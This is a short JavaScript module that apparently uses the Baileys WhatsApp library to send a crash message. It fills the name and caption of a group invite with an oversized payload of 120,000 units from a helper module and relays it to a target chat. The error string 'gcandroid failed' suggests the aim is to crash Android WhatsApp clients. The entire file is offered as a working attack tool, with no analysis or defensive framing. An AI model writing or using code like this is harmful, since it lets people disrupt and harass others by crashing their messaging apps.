
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');

async function Xgc(SYxS7, target) {
    try {
        const superSpam = getSuperPayload(120000);
        const lovemessage = {
            groupInviteMessage: {
                groupName: superSpam,
                groupJid: "561611-1627579259@g.us", 
                inviteCode: "h+64P9RhJDzgXSPf",        
                inviteExpiration: 32503680000,
                caption: superSpam,
                thumbnail: null,
                contextInfo: {}
            }
        };
        await SYxS7.relayMessage(target, lovemessage, {});
    } catch (error) {
        console.error("gcandroid failed →", error.message || error);
    }
}

module.exports = { Xgc };
